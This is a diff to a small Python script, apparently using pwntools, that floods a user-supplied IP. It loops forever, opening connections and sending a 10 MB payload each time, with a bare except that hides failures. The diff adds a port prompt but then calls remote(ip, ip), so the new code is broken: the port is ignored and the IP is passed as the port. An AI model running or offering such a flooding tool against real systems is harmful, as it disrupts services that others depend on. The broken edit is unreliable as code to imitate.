@@ -4,11 +4,12 @@ from time import sleep
 verylargestring = bytes("0" * 10000000, "utf-8")
 print("done")
 ip = input("ip:")
+port = input("port:")
 print("sending packets")
 i = 0
 while True:
     try:
-        p = remote(ip, 5000)
+        p = remote(ip, ip)
         p.send(verylargestring)
         p.close()
     except:
